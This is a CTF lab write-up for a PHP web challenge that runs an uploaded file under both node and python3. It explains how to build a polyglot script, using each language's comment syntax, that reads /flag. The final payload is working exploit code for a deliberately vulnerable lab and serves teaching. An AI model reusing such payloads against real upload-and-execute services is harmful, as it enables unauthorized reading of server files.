# Simple Welcome - 0x04(Lab - Script)
###### tags: `CTF` `Web` `eductf`
Challenge: https://pyscript.ctf.zoolab.org/

## Source Code
```php=
<?php
    if(!isset($_FILES["file"]))
        highlight_file(__file__) && die();
    $flag = file_get_contents('/flag');
    $node = @`node {$_FILES["file"]["tmp_name"]} 2>&1`;
    $python = @`python3 {$_FILES["file"]["tmp_name"]} 2>&1`;
    if($flag === $node && $flag === $python)
        echo 'Here is your Flag: '.$flag;
    else
        echo 'Fail :(';
?>
```
### Analysis
Must write a script that can be executed in python and node language simultaneously.

## Exploit - Using comment
1. In python
The comment is `#` for single line and `'''` for multi lines
2. In node
The comment is `//` for single line and `/**/` for multi lines
3. Using different definition of comment to write script
Some tips:
    ```python!
    a = 1 // 1;
    b = ''''''
    ```
    Both of these instruction are valid in python
4. Whole payload
* Python
    ```python!
    a = 1 // 1 ; b = '''

    console.log('Javascript code here');

    /* '''

    print('Python code here')

    # */
    ```
* Javascript
    ```javascript!
    a = 1 // 1 ; b = '''

    console.log('Javascript code here');

    /* '''

    print('Python code here')

    # */
    ```

* Whole exploit
    ```!=
    a = 1 // 1 ; b = '''

    const fs = require('fs');

    fs.readFile("/flag", 'utf8',(error, data) => {
        if (error) {
            console.error(error);
            return;
        }
        console.log(data.split('\n')[0]);
    })

    /* '''

    f = open("/flag", "r")
    print(f.read().split('\n')[0])
    # */
    ```
## Reference
[【已解决】PHP中函数前面加上at符号@的作用](https://www.crifan.com/php_function_front_at_sign_meaning/)
[[shell 2>&1是甚麼意思]](https://charleslin74.pixnet.net/blog/post/405455902)
[How to open a local file with JavaScript?](https://researchhubs.com/post/computing/javascript/open-a-local-file-with-javascript.html)
[How to Read/Write local files with Node.js](https://medium.com/@SergioPietri/how-to-read-write-local-files-with-node-js-3d2f58b0384)
[String.prototype.split()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split)
